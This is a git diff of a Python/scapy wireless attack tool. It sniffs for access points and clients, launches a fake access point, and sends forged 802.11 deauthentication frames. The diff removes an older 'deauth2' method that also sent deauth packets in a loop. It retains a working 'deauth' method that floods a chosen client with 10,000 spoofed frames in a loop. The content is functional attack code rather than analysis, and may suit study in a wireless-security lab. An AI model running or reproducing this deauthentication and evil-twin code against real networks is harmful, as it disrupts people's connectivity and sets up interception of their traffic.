@@ -4,7 +4,7 @@ import colorama
 from colorama import Fore
 import time
 from datetime import datetime
-from run import print_errors, print_header, print_regular, print_sub_header, switch_to_monitor_mode, switch_to_managed_mode
+from run import print_sub_header, switch_to_monitor_mode, switch_to_managed_mode
 import run
 from string import Template
 from scapy.all import *
@@ -46,7 +46,7 @@ class Attack:
                 self.wlan_interface = sniffer_w
                 result = True
             else:
-                print_errors("{*] You entered an invalid name. Please try again.")
+                print(Fore.RED + "{*] You entered an invalid name. Please try again.")
 
         result = False
         while result == False:
@@ -55,7 +55,7 @@ class Attack:
                 self.fake_ap_interface = sniffer_w
                 result = True
             else:
-                print_errors("{*] You entered an invalid name. Please try again.")
+                print(Fore.RED + "[*] You entered an invalid name. Please try again.")
 
         print(Fore.YELLOW + "[*] switching {} to monitor mode".format(self.wlan_interface))
         switch_to_monitor_mode(self.wlan_interface)
@@ -68,7 +68,7 @@ class Attack:
                 stats = pkt[Dot11Beacon].network_stats()
                 channel = stats.get("channel")
                 self.ap_list.append([ssid, mac, channel])
-                print_regular(Fore.GREEN + '(+) Found new Access Point : SSID = {} , MAC = {}'.format(ssid, mac))
+                print(Fore.GREEN + '(+) Found new Access Point : SSID = {} , MAC = {}'.format(ssid, mac))
 
     def network_search(self, duration: int = 2):
         print(Fore.YELLOW + "[*] starting to sniff for networks")
@@ -156,7 +156,7 @@ class Attack:
                 if pkt.addr1 not in self.client_list:
                     if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                         # Add the new found client to the client list
-                        print_regular(Fore.GREEN + '(+) Found new Client : MAC = {}'.format(pkt.addr1))
+                        print(Fore.GREEN + '(+) Found new Client : MAC = {}'.format(pkt.addr1))
                         self.client_list.append(pkt.addr1)
         except AttributeError:
             return
@@ -168,76 +168,18 @@ class Attack:
             run.restart(self.fake_ap_interface, self.wlan_interface)
             sys.exit()
         fake_ap = fakeAP.fakeAP(self.fake_ap_interface, self.target_ap[0], self.wlan_interface)
-    
-    def deauth2(self, target_client_mac, ap_mac, sniffer):
-        '''
-            RadioTap()/Dot11(...)/Dot11Deauth() 
-            addr1: destination MAC address
-            addr2: source MAC address
-            addr3: BSSID - AP MAC address
-            RadioTap is making it easier to transmit information between OSI layers
-            Dot11 represent the MAC header in the Data Link Layer, it is the abbreviated specification name 802.11
-            Dot11Deauth represent deauthentication packet
-            / - operator that used as a composition operator between two layers
-        '''
-        os.system("iwconfig " + self.wlan_interface + " channel " + str(ap_mac[2]))
-        print(Fore.YELLOW + "[*] Attacking on channel {} ".format(ap_mac[2]))
-
-        ap_mac = ap_mac.lower()
-        # Deauthentication packet from AP to client.
-        pkt_to_c = RadioTap()/Dot11(addr1=target_client_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
-
-        # Deauthentication packet from client to AP.
-        pkt_to_ap = RadioTap()/Dot11(addr1=ap_mac, addr2=target_client_mac, addr3=ap_mac)/Dot11Deauth()
-        print("pkt_to_c = {} {} {}".format(pkt_to_c.addr1, pkt_to_c.addr2, pkt_to_c.addr3))
-        print("pkt_to_ap = {} {} {}".format(pkt_to_ap.addr1, pkt_to_ap.addr2, pkt_to_ap.addr3))
-        global counter
-        counter = 0
-        while counter < 100:
-            print("pkt_to_c = {} {} {}".format(pkt_to_c.addr1, pkt_to_c.addr2, pkt_to_c.addr3))
-            print("pkt_to_ap = {} {} {}".format(pkt_to_ap.addr1, pkt_to_ap.addr2, pkt_to_ap.addr3))
-            counter += 1
-            for i in range(50):
-                
-                ### The sendp() function send packets at layer 2 - Data Link Layer
-                # Sending deauthentication packet from AP to client.
-                print ("Sending deauthentication packet from AP to client")
-                # sendp(pkt_to_c, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
-                sendp(pkt_to_c, iface=sniffer)
-                
-                # Sending deauthentication packet from client to AP.
-                print ("Sending deauthentication packet from client to AP")
-                # sendp(pkt_to_ap, inter=0.1, count=100, iface="wlxd037451d37bc", verbose=1)
-                sendp(pkt_to_ap, iface=sniffer)
-
-                # target_mac = target_client_mac
-                # gateway_mac = "c0:ac:54:f7:b0:02"
-                # # 802.11 frame
-                # # addr1: destination MAC
-                # # addr2: source MAC
-                # # addr3: Access Point MAC
-                # dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-                # # stack them up
-                # packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-                # # send the packet
-                # sendp(packet, inter=.2, count=10000, iface=sniffer, verbose=1)
 
     def deauth(self, target_mac, gateway_mac, iface):
-        output = input(Fore.YELLOW + "[*] To start the de-authentication attack on {} type ok or quit: ".format(self.client_target) )
+        output = input(Fore.YELLOW + "[*] To start the de-authentication attack on {} type ok or type quit: ".format(self.client_target) )
         if output == 'ok':
             os.system("iwconfig " + self.wlan_interface + " channel " + str(self.target_ap[2]))
-            print(Fore.YELLOW + "[*] Attacking on channel of {} (channel {}) ".format(self.target_ap[0], self.target_ap[2]))
-            # 802.11 frame
-            # addr1: destination MAC
-            # addr2: source MAC
-            # addr3: Access Point MAC
+            print(Fore.YELLOW + "[*] Attacking {} on channel {} ".format(self.target_ap[0], self.target_ap[2]))
+            # the frames are of 802.11 addr1 = destenation attr2 = source
             dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-            # stack them up
             packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-            # send the packet
             sendp(packet,  count=10000, iface=iface,loop=2)
         elif output == 'quit':
-            restart(self.fake_ap_interface, self.wlan_interface)
+            run.restart(self.fake_ap_interface, self.wlan_interface)
             sys.exit()
         else:
             print(Fore.RED + "Invalid input please try again")
